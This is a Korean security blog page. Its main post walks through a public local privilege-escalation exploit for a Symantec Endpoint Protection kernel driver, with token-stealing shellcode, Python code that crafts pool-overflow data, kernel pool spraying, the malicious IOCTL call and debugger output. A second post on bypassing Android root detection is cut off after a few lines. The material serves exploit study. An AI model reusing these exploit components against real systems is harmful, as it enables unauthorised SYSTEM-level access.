
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow 참고할만한 문서들은 Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/7/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/14/symantec-endpoint-protection-kernel-pool-overflow/">Symantec Endpoint Protection - Kernel Pool Overflow</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-14T21:21:58+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:21 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://www.exploit-db.com/exploits/34272/">Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow</a></p>

<p>참고할만한 문서들은</p>

<ul>
<li><a href="http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel">Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1</a></li>
<li><a href="https://www.youtube.com/watch?v=-smvfojecvs">Project Heapbleed, BalCCon2k14</a></li>
<li><a href="http://www.slideshare.net/scovetta/kernelpool">Modern Kernel Pool Exploitation: Attacks and Techniques</a></li>
<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
<li><a href="http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf">Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf">Access token stealing on Windows, Csaba Barta, 2009</a></li>
<li><a href="http://www.uninformed.org/?v=3&amp;a=4&amp;t=pdf">Kernel-mode Payloads on Windows, bugcheck and skape</a></li>
<li><a href="http://www.uninformed.org/?v=6&amp;a=2&amp;t=pdf">Exploiting 802.11 Wireless Driver Vulnerabilities on Windows</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf">Remote Windows Kernel Exploitation: Step into the Ring 0</a></li>
<li><a href="http://securityvulns.ru/docs4946.html">Win32 Device Drivers Communication Vulnerabilities, Lord Yup</a></li>
<li><a href="http://www.suse.de/~krahmer/no-nx.pdf">x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique</a></li>
<li>infamous HalDispatchTable</li>
<li>j00ru&rsquo;s research</li>
<li><a href="http://www.alex-ionescu.com/?p=231">Alex&rsquo;s lonescu research</a></li>
<li>Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011</li>
<li>Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008</li>
<li>SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005</li>
<li><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">Windows 8 Heap Internals</a></li>
<li><a href="https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf">GDI Font Fuzzing in Windows Kernel for Fun</a></li>
<li><a href="http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf">Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel</a></li>
<li><a href="http://j00ru.vexillium.org/?p=290">GDT and LDT in Windows kernel vulnerability exploitation</a></li>
<li>SoBelt X'con 2005</li>
<li>Kostya Kortchinsky SyScan 2008</li>
<li>Tarjei Mandt BH DC 2011</li>
</ul>


<h4>Exploit Strategy</h4>

<p><a href="http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html">OkayToCloseProcedure callback kernel hook</a></p>

<ul>
<li>IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.</li>
<li>ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.</li>
<li>이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.</li>
<li>OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.</li>
<li>Shellcode 는 Type Index 를 repair 하고, <code>nt authority\SYSTEM</code> 을 훔친다.</li>
</ul>


<h4>Token Stealing Shellcode</h4>

<p>Exploit 에서 사용된 shellcode 는 token stealing shellcode.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tokenstealing = (
</span><span class='line'>"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
</span><span class='line'>"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
</span><span class='line'>"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
</span><span class='line'>"\x00"
</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>


<p>Disassemble 해봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>33c0                    xor eax,eax
</span><span class='line'>648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>8b4050                  mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>8bc8                    mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>2db8000000              sub eax,0xb8
</span><span class='line'>83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>75ec                    jne loc_0000000e
</span><span class='line'>8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>8991f8000000            mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>c21000                  ret 0x10</span></code></pre></td></tr></table></div></figure>


<p><code>EPROCESS</code> 구조체에서 <code>Token</code> 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
<code>SYSTEM</code> 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.</p>

<p>Target 이 IDLE 상태라면, <code>FS:[0x124]</code> 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.</p>

<h4>Hotpatching SYSFER.DLL</h4>

<ol>
<li>VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.</li>
<li>할당받은 메모리에 크기 <code>0x44c</code> 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.</li>
<li>SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다.</li>
<li>저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 <code>child_block</code> 과 <code>child_block_size</code> 의 주소를 찾아낸다.</li>
<li>2 번의 메모리 주소로 <code>child_block</code> 을 overwrite 한다. 이제 <code>child_block</code> 은 악의적인 데이터를 포인팅한다.</li>
<li><code>0x44c</code> 로 <code>child_block_size</code> 를 overwrite 한다.</li>
</ol>


<h4>Evil child_block</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>""" Allocate the source buffer in the parent process """
</span><span class='line'>v = kernel32.VirtualAllocEx(phandle, 
</span><span class='line'>        0x0, 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        MEM_RESERVE|MEM_COMMIT, 
</span><span class='line'>        PAGE_EXECUTE_READWRITE)
</span><span class='line'># 8654c580  040c0090 ef436f49 00000000 0000005c
</span><span class='line'># 8654c590  00000000 00000000 00000001 00000001
</span><span class='line'># 8654c5a0  00000000 0008000a
</span><span class='line'>quota   = "\x00\x00\x00\x00"   
</span><span class='line'>header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00"
</span><span class='line'># TypeIndex = "\x0a\x00\x08\x00"
</span><span class='line'>TypeIndex = "\x00\x00\x08\x00"
</span><span class='line'>offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
</span><span class='line'>overflow  = offset + quota + header + TypeIndex 
</span><span class='line'>csrc      = create_string_buffer(overflow, evil_child_block_size)
</span><span class='line'>wrote     = c_ulong(0)
</span><span class='line'>res = kernel32.WriteProcessMemory(phandle, v, 
</span><span class='line'>        addressof(csrc), 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        byref(wrote))</span></code></pre></td></tr></table></div></figure>


<p><code>IoCompletionReserve</code> 오브젝트를 overwrite 할 것인데, <code>TypeIndex</code> 가 원래는 <code>0x0A</code> 인데 <code>0x00</code> 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.</p>

<p>아래의 <code>TypeIndex</code> 를 0 으로 overwrite 한다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
</span><span class='line'>+0x000 PointerCount : Int4B
</span><span class='line'>+0x004 HandleCount : Int4B
</span><span class='line'>+0x004 NextToFree : Ptr32 Void
</span><span class='line'>+0x008 Lock : _EX_PUSH_LOCK
</span><span class='line'>+0x00c TypeIndex : UChar &lt;- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
</span><span class='line'>+0x00d TraceFlags : Uchar
</span><span class='line'>+0x00d DbgRefTrace : Pos 0, 1 Bit
</span><span class='line'>+0x00d DbgTracePermanent : Pos 1, 1 Bit
</span><span class='line'>+0x00e InfoMask : UChar
</span><span class='line'>+0x00f Flags : UChar
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p><code>ObTypeIndexTable</code> 을 보면,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dd nt!ObTypeIndexTable 
</span><span class='line'>81a3edc0 00000000 bad0b0b0 85543768 855436a0
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _OBJECT_TYPE 85543768
</span><span class='line'>+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
</span><span class='line'>...
</span><span class='line'>+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 TypeInfo 를 까보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
</span><span class='line'>+0x000 Length               : 0x50
</span><span class='line'>...
</span><span class='line'>+0x04c OkayToCloseProcedure : (null)</span></code></pre></td></tr></table></div></figure>


<p><code>0x28</code> + <code>0x4c</code> = <code>0x74</code> 이니까, <code>Type Index</code> 를 0 으로 세팅하면 <code>0x00000000 + 0x74</code> 에서 <code>OkayToCloseProcedure</code> 를 읽게된다.</p>

<h4>allocShellcode()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\x42" * 0x70
</span><span class='line'>
</span><span class='line'>OkayToCloseProcedure (0x00000078)
</span><span class='line'>
</span><span class='line'>ADD ESI,0C
</span><span class='line'>MOV DWORD PTR DS:[ESI],8000A
</span><span class='line'>SUB ESI,0C # RESTORE TypeIndex
</span><span class='line'>
</span><span class='line'>xor eax,eax # Token stealing shellcode
</span><span class='line'>mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>sub eax,0xb8
</span><span class='line'>cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>jne loc_0000000e
</span><span class='line'>mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>ret 0x10
</span><span class='line'>
</span><span class='line'>"\x90"
</span><span class='line'>"\x90"
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이 쉘코드를 NtAllocateVirtualMemory() 로 <code>0x00000004</code> 에 allocate 한다.</p>

<h4>Spray()</h4>

<p>Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
from the non-paged kernel pool.</p>

<p>When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.</p>

<p>exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>global handles, done
</span><span class='line'>handles = {}
</span><span class='line'>for i in range(0,5000):
</span><span class='line'>    hHandle = HANDLE(0)
</span><span class='line'>    ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
</span><span class='line'>    handles[hHandle.value] = hHandle</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">Exploits for MS10-058, Jeremy Fetiveau</a></li>
<li><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406</a></li>
</ul>


<h4>NtAllocateReserveObject()</h4>

<p>In short, <code>NtAllocateReserveObject</code> makes it possible for any system user to allocate a buffer
on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
As it will turn out later in this paper, the above can give us pretty much control over the
kernel memory, when exploiting custom vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define APC_OBJECT              0
</span><span class='line'>#define IO_COMPLETION_OBJECT    1
</span><span class='line'>#define MAX_OBJECT_ID           1
</span><span class='line'>
</span><span class='line'>NTSTATUS STDCALL NtAllocateReserveObject(
</span><span class='line'>    OUT PHANDLE hObject,
</span><span class='line'>    IN  POBJECT_ATTRIBUTE ObjectAttributes,
</span><span class='line'>    IN  DWORD ObjectType)
</span><span class='line'>{
</span><span class='line'>    PVOID ObjectBuffer;
</span><span class='line'>    HANDLE hOutputHandle;
</span><span class='line'>    NTSTATUS NtStatus;
</span><span class='line'>
</span><span class='line'>    if (PreviousMode == UserMode) {
</span><span class='line'>        // Validate hObject
</span><span class='line'>    }
</span><span class='line'>    if (ObjectType &gt; MAX_OBJECT_ID) {
</span><span class='line'>        /* Bail out: STATUS_INVALID_PARAMETER
</span><span class='line'>         */
</span><span class='line'>    } else {
</span><span class='line'>        NtStatus = ObCreateObject(PreviousMode,
</span><span class='line'>                                    PspMemoryReserveObjectTypes[ObjectType],
</span><span class='line'>                                    ObjectAttributes,
</span><span class='line'>                                    PreviousMode,
</span><span class='line'>                                    0,
</span><span class='line'>                                    PspMemoryReserveObjectSizes[ObjectType],
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    &ObjectBuffer);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>
</span><span class='line'>        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);
</span><span class='line'>
</span><span class='line'>        if (ObjectType == IO_COMPLETION) {
</span><span class='line'>            //
</span><span class='line'>            // Perform some ObjectBuffer initialization
</span><span class='line'>            //
</span><span class='line'>            ObjectBuffer[0x0C] = 3;
</span><span class='line'>            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
</span><span class='line'>            ObjectBuffer[0x24] = ObjectBuffer;
</span><span class='line'>            ObjectBuffer[0x28] = 0;
</span><span class='line'>        }
</span><span class='line'>        NtStatus = ObInsertObjectEx(ObjectBuffer,
</span><span class='line'>                                    &hOutputHandle,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0xF0003,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>        *hObject = hOutputHandle;
</span><span class='line'>    }
</span><span class='line'>    return NtStatus;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>DeviceIoControl()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL WINAPI DeviceIoControl(HANDLE hDevice,
</span><span class='line'>                            DWORD dwIoControlCode,
</span><span class='line'>                            LPVOID lpInBuffer,
</span><span class='line'>                            DWORD nInBufferSize,
</span><span class='line'>                            LPVOID lpOutputBuffer,
</span><span class='line'>                            DWORD nOutBufferSize,
</span><span class='line'>                            LPDWORD lpBytesReturned,
</span><span class='line'>                            LPOVERLAPPED lpOverlapped);</span></code></pre></td></tr></table></div></figure>


<p>파라메터중에서 중요한 것은 <code>hDevice</code>, <code>dwIoControlCode</code>, <code>lpInBuffer</code>, <code>lpOutputBuffer</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dwReturn = c_ulong()
</span><span class='line'>
</span><span class='line'>evil_input = "\x41" * 4 + struct.pack("&lt;L", 0x00222084) + "D" * 56
</span><span class='line'>
</span><span class='line'>evil_size = len(evil_input)
</span><span class='line'>einput = create_string_buffer(evil_input, evil_size)
</span><span class='line'>eoutput = create_string_buffer("\x00" * 1024, 1024)
</span><span class='line'>driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
</span><span class='line'>...
</span><span class='line'>kernel32.DeviceIoControl(driver_handle, 0x00222084, 
</span><span class='line'>                            addressof(einput), evil_size, 
</span><span class='line'>                            addressof(eoutput), 1024, 
</span><span class='line'>                            byref(dwReturn), None)</span></code></pre></td></tr></table></div></figure>


<p>이 커맨드가 <code>SYSPLANT.sys</code> 의 <code>DriverDispatcher()</code> 에 날라가면 <code>SYSFER.dll</code> 의 <code>child_block</code> 에 담가둔 오염된 데이터때문에 <code>SYSPLANT.sys</code> 가 뻘짓을 하게 되는 흐름.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/10/root-detection-on-android-is-useless/">Root Detection on Android Is Useless</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T21:50:03+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:50 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://github.com/serianox/rd">@Serianox_: Root detection on Android is useless, so I wrote 200 lines of (ugly) C to prove it. :3</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
